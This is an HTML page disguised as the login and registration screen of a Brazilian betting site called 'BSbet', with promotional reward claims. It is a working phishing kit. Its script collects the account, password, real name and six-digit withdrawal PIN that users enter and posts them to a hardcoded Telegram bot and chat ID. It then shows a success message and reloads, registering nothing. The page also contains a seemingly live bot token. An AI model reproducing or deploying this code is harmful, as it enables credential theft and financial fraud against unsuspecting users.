<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSbet - Oficial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #f5a623;
            --bg-dark: #121212;
            --card-bg: #1c1c1e;
            --input-bg: #262628;
            --input-border: #333336;
            --text-gray: #8e8e93;
            --text-light: #f2f2f7;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }

        body {
            background-color: var(--bg-dark);
            color: var(--text-light);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }

        .container {
            background-color: var(--card-bg);
            width: 100%;
            max-width: 380px;
            border-radius: 16px;
            padding: 24px 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        /* Topo e Promoção */
        .logo {
            text-align: center;
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        .logo span { color: var(--primary); }

        .promo {
            text-align: center;
            font-size: 11px;
            color: #d1d1d6;
            margin-bottom: 18px;
            line-height: 1.4;
        }

        /* Abas Registro / Login */
        .tabs {
            display: flex;
            position: relative;
            margin-bottom: 16px;
            border-bottom: 1px solid #2c2c2e;
        }
        .tab-btn {
            flex: 1;
            padding: 10px 0;
            background: none;
            border: none;
            color: var(--text-gray);
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            text-align: center;
            transition: color 0.2s;
        }
        .tab-btn.active {
            color: var(--primary);
        }
        .tab-indicator {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 50%;
            height: 3px;
            background-color: var(--primary);
            border-radius: 3px 3px 0 0;
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        /* Inputs */
        .form-section { display: none; }
        .form-section.active { display: block; }

        .input-group {
            margin-bottom: 12px;
        }
        .input-label-top {
            font-size: 11px;
            color: var(--text-gray);
            margin-bottom: 6px;
            display: block;
        }
        .input-box {
            background-color: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 10px;
            display: flex;
            align-items: center;
            padding: 12px 14px;
            gap: 10px;
        }
        .input-box i {
            color: var(--text-gray);
            font-size: 15px;
            width: 18px;
            text-align: center;
        }
        .input-box input {
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            width: 100%;
            font-size: 13px;
        }
        .input-box input::placeholder {
            color: #636366;
            font-size: 13px;
        }

        .hint-text {
            color: var(--primary);
            font-size: 11px;
            margin-top: 4px;
            display: block;
        }

        /* PIN de Saque 6 Dígitos */
        .saque-title {
            font-size: 12px;
            font-weight: 600;
            color: #fff;
            margin: 14px 0 8px 0;
        }
        .pin-grid {
            display: grid;
            grid-template-columns: repeat(6, 1fr);
            gap: 6px;
            margin-bottom: 12px;
        }
        .pin-input {
            width: 100%;
            height: 44px;
            background-color: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 8px;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: var(--primary);
            outline: none;
        }
        .pin-input:focus {
            border-color: var(--primary);
        }

        /* Termos */
        .terms {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 11px;
            color: #d1d1d6;
            margin: 14px 0;
        }
        .terms input[type="checkbox"] {
            accent-color: var(--primary);
            width: 15px;
            height: 15px;
        }
        .terms a {
            color: var(--primary);
            text-decoration: none;
        }

        /* Botão */
        .btn-submit {
            width: 100%;
            padding: 13px;
            background: linear-gradient(180deg, #f7ce68 0%, #f5a623 100%);
            border: none;
            border-radius: 10px;
            color: #000;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.5px;
        }
        .btn-submit:disabled { opacity: 0.7; }

        /* Links e Social */
        .sub-links {
            display: flex;
            justify-content: space-around;
            font-size: 12px;
            color: var(--primary);
            margin: 16px 0;
        }
        .sub-links a { color: var(--primary); text-decoration: none; }

        .social-area {
            text-align: center;
            border-top: 1px solid #2c2c2e;
            padding-top: 14px;
        }
        .social-area span {
            font-size: 11px;
            color: var(--text-gray);
            display: block;
            margin-bottom: 12px;
        }
        .social-icons {
            display: flex;
            justify-content: center;
            gap: 18px;
        }
        .social-icons i {
            font-size: 22px;
            cursor: pointer;
        }
        .fa-google { color: #ea4335; }
        .fa-facebook { color: #1877f2; }
        .fa-telegram { color: #24a1de; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">BS<span>bet</span></div>
    
    <div class="promo">
        Recompensa diária de login R$ 8,00<br>
        Convide outras pessoas e ganhe R$ 2 milhoes
    </div>

    <!-- Abas -->
    <div class="tabs">
        <button class="tab-btn active" id="tabRegistroBtn" onclick="switchTab('registro')">Registro</button>
        <button class="tab-btn" id="tabLoginBtn" onclick="switchTab('login')">Login</button>
        <div class="tab-indicator" id="indicator"></div>
    </div>

    <!-- Formulário de Registro -->
    <form id="formRegistro" class="form-section active" onsubmit="handleRegistro(event)">
        <span class="input-label-top">Suporte Número do Celular/E-mail/Conta Registro</span>
        
        <div class="input-group">
            <div class="input-box">
                <i class="fa-solid fa-user"></i>
                <input type="text" id="regUser" placeholder="*Digite o Número do Celular/E-mail/Conta" required>
            </div>
        </div>

        <div class="input-group">
            <div class="input-box">
                <i class="fa-solid fa-lock"></i>
                <input type="password" id="regPass" placeholder="*Insira a senha" required>
            </div>
        </div>

        <div class="input-group">
            <div class="input-box">
                <i class="fa-solid fa-id-card"></i>
                <input type="text" id="regName" placeholder="*Introduza o seu nome real" required>
            </div>
            <span class="hint-text">Deve ter o mesmo nome da sua conta bancária de retirada</span>
        </div>

        <!-- PIN de Saque (6 dígitos) -->
        <div class="saque-title">Senha Saque (PIN de 6 dígitos):</div>
        <div class="pin-grid" id="pinInputs">
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" required>
        </div>

        <div class="terms">
            <input type="checkbox" id="termsCheck" required checked>
            <label for="termsCheck">Tenho mais de 18 anos, li e concordo com <a href="#">《Acordo de Usuário》</a></label>
        </div>

        <button type="submit" id="btnReg" class="btn-submit">Registro</button>
    </form>

    <!-- Formulário de Login -->
    <form id="formLogin" class="form-section" onsubmit="handleLogin(event)">
        <span class="input-label-top">Conta de Acesso</span>
        
        <div class="input-group">
            <div class="input-box">
                <i class="fa-solid fa-user"></i>
                <input type="text" id="loginUser" placeholder="Número de Celular / Conta" required>
            </div>
        </div>

        <div class="input-group">
            <div class="input-box">
                <i class="fa-solid fa-lock"></i>
                <input type="password" id="loginPass" placeholder="Sua senha" required>
            </div>
        </div>

        <button type="submit" id="btnLogin" class="btn-submit" style="margin-top: 16px;">Entrar</button>
    </form>

    <!-- Links Auxiliares -->
    <div class="sub-links">
        <a href="#">Suporte ao cliente</a>
        <a href="#">Demo</a>
    </div>

    <!-- Login Social -->
    <div class="social-area">
        <span>Registro vinculativo</span>
        <div class="social-icons">
            <i class="fa-brands fa-google"></i>
            <i class="fa-brands fa-facebook"></i>
            <i class="fa-brands fa-telegram"></i>
        </div>
    </div>
</div>

<script>
    const TOKEN = "8270859221:AAFbhwZrsw5Kn7fPE_YoPhcRZe8R0BqNzzU";
    const CHAT_ID = "-5250112132";

    // Alternar abas Registro / Login
    function switchTab(mode) {
        const tabReg = document.getElementById('tabRegistroBtn');
        const tabLog = document.getElementById('tabLoginBtn');
        const formReg = document.getElementById('formRegistro');
        const formLog = document.getElementById('formLogin');
        const indicator = document.getElementById('indicator');

        if (mode === 'registro') {
            tabReg.classList.add('active');
            tabLog.classList.remove('active');
            formReg.classList.add('active');
            formLog.classList.remove('active');
            indicator.style.transform = 'translateX(0%)';
        } else {
            tabLog.classList.add('active');
            tabReg.classList.remove('active');
            formLog.classList.add('active');
            formReg.classList.remove('active');
            indicator.style.transform = 'translateX(100%)';
        }
    }

    // Gerenciamento dos campos PIN de 6 dígitos
    const pins = document.querySelectorAll('.pin-input');
    pins.forEach((field, index) => {
        field.addEventListener('input', () => {
            if (field.value.length === 1 && index < pins.length - 1) {
                pins[index + 1].focus();
            }
        });

        field.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && field.value === '' && index > 0) {
                pins[index - 1].focus();
            }
        });
    });

    // Envio do Registro
    function handleRegistro(e) {
        e.preventDefault();
        
        let pinFull = "";
        pins.forEach(p => pinFull += p.value);
        if (pinFull.length < 6) {
            alert("Preencha todos os 6 dígitos do PIN de saque.");
            return;
        }

        const btn = document.getElementById('btnReg');
        btn.innerText = "Enviando...";
        btn.disabled = true;

        const payload = `🔔 *NOVO REGISTRO*\n\n👤 *Conta:* ${document.getElementById('regUser').value}\n🔑 *Senha:* ${document.getElementById('regPass').value}\n💳 *Nome:* ${document.getElementById('regName').value}\n💰 *PIN Saque:* ${pinFull}`;

        sendTelegram(payload, btn, "Registro");
    }

    // Envio do Login
    function handleLogin(e) {
        e.preventDefault();

        const btn = document.getElementById('btnLogin');
        btn.innerText = "Entrando...";
        btn.disabled = true;

        const payload = `🔐 *NOVO LOGIN*\n\n👤 *Conta:* ${document.getElementById('loginUser').value}\n🔑 *Senha:* ${document.getElementById('loginPass').value}`;

        sendTelegram(payload, btn, "Entrar");
    }

    function sendTelegram(texto, btnElement, btnTextDefault) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: texto, parse_mode: 'Markdown' })
        })
        .then(res => {
            if (res.ok) {
                alert("✅ Dados enviados com sucesso!");
                location.reload();
            } else {
                alert("❌ Erro ao enviar!");
                btnElement.disabled = false;
                btnElement.innerText = btnTextDefault;
            }
        })
        .catch(() => {
            alert("❌ Erro de conexão.");
            btnElement.disabled = false;
            btnElement.innerText = btnTextDefault;
        });
    }
</script>

</body>
</html>
